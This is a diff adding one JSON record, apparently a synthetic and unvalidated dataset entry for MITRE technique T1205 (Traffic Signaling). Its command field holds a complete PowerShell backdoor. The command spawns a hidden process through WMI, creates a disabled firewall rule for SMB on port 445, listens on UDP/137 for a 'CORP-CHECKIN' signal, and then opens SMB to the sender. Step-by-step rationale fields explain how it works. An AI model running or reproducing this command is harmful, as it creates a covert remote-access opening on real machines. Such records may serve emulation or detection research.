@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(137); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 50){ $s=[Text.Encoding]::ASCII.GetString($d); if($s -like ''*CORP-CHECKIN*''){ Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Enabled True -RemoteAddress $ep.Address; break } } } }'",
+  "explanation": "Observes NetBIOS Name Service traffic on UDP/137 and checks for a uniquely encoded name containing 'CORP-CHECKIN' (application-specific NBNS name). When seen, it enables an SMB firewall rule for the signaling host.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/445.",
+    "Bind to UDP/137 and scan NBNS payload for a sentinel name.",
+    "Enable the SMB rule restricted to the source IP upon match."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-81a5cd9c",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
